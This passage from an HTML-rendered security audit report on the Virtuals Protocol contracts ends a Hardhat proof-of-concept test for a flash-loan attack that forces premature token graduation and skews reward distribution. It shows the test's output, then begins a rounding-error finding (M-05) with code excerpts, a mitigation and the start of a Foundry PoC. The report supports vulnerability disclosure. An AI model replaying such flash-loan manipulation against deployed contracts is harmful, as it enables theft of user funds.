= parseEther(\u0026quot;10000\u0026quot;); // 10,000 VIRTUAL tokens as rewards\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(deployer.address, rewardAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.approve(rewards.target, rewardAmount);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Distribute rewards\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await rewards.distributeRewards(rewardAmount, [virtualId], false);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Rewards distributed\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Check rewards allocation\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentRewardCount = await rewards.agentRewardCount(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Agent reward count:\u0026quot;, agentRewardCount.toString());\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Verify rewards were allocated\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(agentRewardCount).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Access the first agent reward directly\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentReward = await rewards.getAgentReward(virtualId, 0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;Agent reward details:\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;- Staker Amount:\u0026quot;, formatEther(agentReward.stakerAmount));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;- Validator Amount:\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      formatEther(agentReward.validatorAmount)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    console.log(\u0026quot;- Total Staked:\u0026quot;, formatEther(agentReward.totalStaked));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Both stakers and validators receive rewards from the manipulated LP value\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(agentReward.stakerAmount).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    expect(agentReward.validatorAmount).to.be.gt(0);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  });\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003cp\u003eSee test results:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"47\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  Bonding\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eToken created: 0xeC05bC6e8B4DEc3299fA25BDFBd44A43Db415995\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eFlash loan acquired: 100000.0 VIRTUAL\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eInitial balances:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Trader VIRTUAL: 100000.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Pair VIRTUAL: 100.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Founder CAT: 32258064.516129032258064517\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAgent token created: 0x08BD7109ed9c72771A4e494D155e2F31C65205D9\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTrader CAT balance: 889001778.003556007112014224\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTrader agent token balance after unwrap: 889001778.003556007112014224\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eUniswap pair: 0x23457Bea4813642d6f3d4BFDDD461d7f738639cF\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eFinal trader VIRTUAL balance: 97209.656939017097749081\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eFlash loan amount: 100000.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eDifference: 2n\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eVirtual ID: 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eLP token: 0x23457Bea4813642d6f3d4BFDDD461d7f738639cF\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eveToken: 0x75D4c71311994307616350d38f2E832A57440da5\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003efounder veToken balance: 1662461.882480317200970858\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eTrader delegated to self\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eSetting up rewards contract for validation...\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eLP value for virtualId 1: 2890.343060982902250919\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eRewards distributed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAgent reward count: 1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eAgent reward details:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Staker Amount: 9000.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Validator Amount: 1000.0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e- Total Staked: 1662461.882480317200970858\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ✔ flash loan attack force premature graduation, manipulating rewards (1053ms)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e1 passing (1s)\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNote: in order to run tests, I forked eth mainnet in hardhat network and used mainnet \u003ccode\u003eUNISWAP_ROUTER\u003c/code\u003e and \u003ccode\u003eUNISWAP_FACTORY\u003c/code\u003e addresses. I also tweaked \u003ccode\u003e.env\u003c/code\u003e and hardhat config accordingly. \u003c/p\u003e\n\u003cp\u003eRun test: npx hardhat test \u003ccode\u003etest/bonding.js\u003c/code\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-05-division-in-bondingsol_opentradingonuniswap-results-in-an-incorrect-lpsupply-higher-vaultsupply-and-dust-agenttokens-getting-locked-in-fpair\" style=\"position:relative;\"\u003e\u003ca href=\"#m-05-division-in-bondingsol_opentradingonuniswap-results-in-an-incorrect-lpsupply-higher-vaultsupply-and-dust-agenttokens-getting-locked-in-fpair\" aria-label=\"m 05 division in bondingsol_opentradingonuniswap results in an incorrect lpsupply higher vaultsupply and dust agenttokens getting locked in fpair permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-13\"\u003e[M-05] Division in \u003ccode\u003eBonding.sol._openTradingOnUniswap()\u003c/code\u003e results in an incorrect \u003ccode\u003elpSupply\u003c/code\u003e, higher \u003ccode\u003evaultSupply\u003c/code\u003e, and dust \u003ccode\u003eAgentTokens\u003c/code\u003e getting locked in \u003ccode\u003eFPair\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-312\"\u003eBowTiedOriole\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-555\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eWhen a Prototype Agent graduates to a Sentient Agent, agent tokens are minted to the \u003ccode\u003eFPair\u003c/code\u003e contract. Users are then able to call \u003ccode\u003eBonding.unwrapToken()\u003c/code\u003e to claim their agent tokens.\u003c/p\u003e\n\u003cp\u003eUpon graduation, the Bonding contract will divide the token supply as well as the \u003ccode\u003etokenBalance\u003c/code\u003e by \u003ccode\u003e10 ** 18\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/fun/Bonding.sol#L390-L395\"\u003eBonding.sol#L390-L395\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentFactoryV3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecuteBondingCurveApplication\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_token\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edecimals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edecimals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWithin \u003ccode\u003eAgentFactoryV3.executeBondingCurveApplication()\u003c/code\u003e, these parameters are used to calculate the vault supply.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentFactoryV3.sol#L466-L480\"\u003eAgentFactoryV3.sol#L466-480\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenSupplyParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencode\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/* vaultSupply */\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evault\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThen, within \u003ccode\u003eAgentToken.initialize()\u003c/code\u003e, the provided numbers will be multiplied by \u003ccode\u003e10 ** 18\u003c/code\u003e. \u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentToken.sol#L95-L96\"\u003eAgentToken.sol#L95-L96\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupplyParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edecimals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evaultSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupplyParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evaultSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * (\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ** \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edecimals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen \u003ccode\u003elpSupply\u003c/code\u003e is calculated as \u003ccode\u003etokenBalance / (10 ** token_.decimals())\u003c/code\u003e it will truncate any remainder after dividing by 1 ether. Then it will be multiplied by \u003ccode\u003e10 ** token_.decimals()\u003c/code\u003e which results in a value that is smaller than the original \u003ccode\u003elpSupply\u003c/code\u003e. This will result in \u003ccode\u003evaultSupply\u003c/code\u003e being too big and \u003ccode\u003eAgentTokens\u003c/code\u003e being stuck in the \u003ccode\u003eFPair\u003c/code\u003e contract.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-10\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-10\" aria-label=\"recommended mitigation steps 10 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eRemove the division and then multiplication by \u003ccode\u003e10 ** token_.decimals()\u003c/code\u003e. Simply pass through the full wei value.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-8\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"51\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// SPDX-License-Identifier: UNLICENSED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e13\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk15\"\u003eimport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e} \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;forge-std/Test.sol\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan 